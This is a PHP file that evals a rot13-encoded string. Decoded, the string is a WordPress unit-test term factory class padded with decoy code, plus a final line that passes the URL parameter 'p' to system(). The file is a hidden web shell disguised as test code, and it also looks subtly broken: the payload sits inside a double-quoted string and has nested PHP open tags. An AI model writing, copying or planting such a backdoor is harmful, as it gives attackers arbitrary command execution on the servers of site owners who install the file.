<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfg snpgbel sbe grezf.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @zrgubq vag|JC_Reebe          perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq JC_Grez|JC_Reebe|ahyy perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[]      perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Grez rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	cevingr $gnkbabzl;
	pbafg QRSNHYG_GNKBABZL = 'cbfg_gnt';

	choyvp shapgvba __pbafgehpg( $snpgbel = ahyy, $gnkbabzl = ahyy ) {
		cnerag::__pbafgehpg( $snpgbel );
		$guvf->gnkbabzl                       = $gnkbabzl ? $gnkbabzl : frys::QRSNHYG_GNKBABZL;
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = neenl(
			'anzr'        => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Grez %f' ),
			'gnkbabzl'    => $guvf->gnkbabzl,
			'qrfpevcgvba' => arj JC_HavgGrfg_Trarengbe_Frdhrapr( 'Grez qrfpevcgvba %f' ),
		);
	}

	/**
	 * Perngrf n grez bowrpg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl $netf Neenl bs nethzragf sbe vafregvat n grez.
	 *
	 * @erghea vag|JC_Reebe Gur grez VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf ) {
		$netf         = neenl_zretr( neenl( 'gnkbabzl' => $guvf->gnkbabzl ), $netf );
		$grez_vq_cnve = jc_vafreg_grez( $netf['anzr'], $netf['gnkbabzl'], $netf );

		vs ( vf_jc_reebe( $grez_vq_cnve ) ) {
			erghea $grez_vq_cnve;
		}

		erghea $grez_vq_cnve['grez_vq'];
	}

	/**
	 * Hcqngrf gur grez.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz vag|bowrpg $grez   Gur grez gb hcqngr.
	 * @cnenz neenl      $svryqf Neenl bs nethzragf sbe hcqngvat n grez.
	 *
	 * @erghea vag|JC_Reebe Gur grez VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_bowrpg( $grez, $svryqf ) {
		$svryqf = neenl_zretr( neenl( 'gnkbabzl' => $guvf->gnkbabzl ), $svryqf );

		vs ( vf_bowrpg( $grez ) ) {
			$gnkbabzl = $grez->gnkbabzl;
		}

		$grez_vq_cnve = jc_hcqngr_grez( $grez, $gnkbabzl, $svryqf );

		vs ( vf_jc_reebe( $grez_vq_cnve ) ) {
			erghea $grez_vq_cnve;
		}

		erghea $grez_vq_cnve['grez_vq'];
	}

	/**
	 * Nggnpu grezf gb gur tvira cbfg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag          $cbfg_vq  Gur cbfg VQ.
	 * @cnenz fgevat|neenl $grezf    Na neenl bs grezf gb frg sbe gur cbfg, be n fgevat bs grezf
	 *                               frcnengrq ol pbzznf. Uvrenepuvpny gnkbabzvrf zhfg nyjnlf cnff VQf engure
	 *                               guna anzrf fb gung puvyqera jvgu gur fnzr anzrf ohg qvssrerag cneragf
	 *                               nera'g pbashfrq.
	 * @cnenz fgevat       $gnkbabzl Gnkbabzl anzr.
	 * @cnenz obby         $nccraq   Bcgvbany. Vs gehr, qba'g qryrgr rkvfgvat grezf, whfg nqq ba. Vs snyfr,
	 *                               ercynpr gur grezf jvgu gur arj grezf. Qrsnhyg gehr.
	 *
	 * @erghea neenl|snyfr|JC_Reebe Neenl bs grez gnkbabzl VQf bs nssrpgrq grezf. JC_Reebe be snyfr ba snvyher.
	 */
	choyvp shapgvba nqq_cbfg_grezf( $cbfg_vq, $grezf, $gnkbabzl, $nccraq = gehr ) {
		erghea jc_frg_cbfg_grezf( $cbfg_vq, $grezf, $gnkbabzl, $nccraq );
	}

	/**
	 * Perngr n grez naq ergheaf vg nf na bowrpg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl $netf                   Neenl be fgevat bs nethzragf sbe vafregvat n grez.
	 * @cnenz ahyy  $trarengvba_qrsvavgvbaf Gur qrsnhyg inyhrf.
	 *
	 * @erghea JC_Grez|JC_Reebe|ahyy JC_Grez ba fhpprff. JC_Reebe vs gnkbabzl qbrf abg rkvfg. Ahyy sbe zvfpryynarbhf snvyher.
	 */
	choyvp shapgvba perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy ) {
		$grez_vq = $guvf->perngr( $netf, $trarengvba_qrsvavgvbaf );

		vs ( vf_jc_reebe( $grez_vq ) ) {
			erghea $grez_vq;
		}

		$gnkbabzl = vffrg( $netf['gnkbabzl'] ) ? $netf['gnkbabzl'] : $guvf->gnkbabzl;

		erghea trg_grez( $grez_vq, $gnkbabzl );
	}

	/**
	 * Ergevrirf gur grez ol n tvira VQ.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag $grez_vq VQ bs gur grez gb ergevrir.
	 *
	 * @erghea JC_Grez|JC_Reebe|ahyy JC_Grez ba fhpprff. JC_Reebe vs gnkbabzl qbrf abg rkvfg. Ahyy sbe zvfpryynarbhf snvyher.
	 */
	choyvp shapgvba trg_bowrpg_ol_vq( $grez_vq ) {
		erghea trg_grez( $grez_vq, $guvf->gnkbabzl );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>